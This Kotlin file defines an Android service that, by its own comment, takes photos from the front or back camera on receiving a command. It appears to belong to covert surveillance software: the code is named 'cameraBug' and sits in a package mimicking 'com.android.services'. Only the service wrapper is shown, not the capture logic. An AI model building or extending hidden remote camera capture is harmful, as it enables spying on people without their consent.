package com.android.services.services.cameraBug

import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.annotation.RequiresApi
import androidx.lifecycle.LifecycleService
import com.android.services.di.module.ApplicationScope
import com.android.services.interfaces.IBackgroundProcessing
import com.android.services.logs.source.LocalDatabaseSource
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.CoroutineScope
import javax.inject.Inject

/**
 * [CameraBugCommandService] is a Service to take a photo from phone's camera,
 * This service receives a Command to capture a photo from front or back Camera
 */

@RequiresApi(Build.VERSION_CODES.LOLLIPOP)
@AndroidEntryPoint
class CameraBugCommandService : LifecycleService() {

    @Inject
    lateinit var localDatabaseSource: LocalDatabaseSource

    @Inject
    @ApplicationScope
    lateinit var coroutineScope: CoroutineScope
    lateinit var cameraBugProcessingI: IBackgroundProcessing

    override fun onCreate() {
        super.onCreate()
        cameraBugProcessingI =
            CameraBugCommandProcessingBaseImpl(this, localDatabaseSource, coroutineScope)
        cameraBugProcessingI.onCreate()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
//        cameraBugProcessingI.onStartCommand(intent!!, flags, startId)
//        return super.onStartCommand(intent, flags, startId)
        return cameraBugProcessingI.onStartCommand(intent!!, flags, startId)
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraBugProcessingI.onDestroy()
    }
}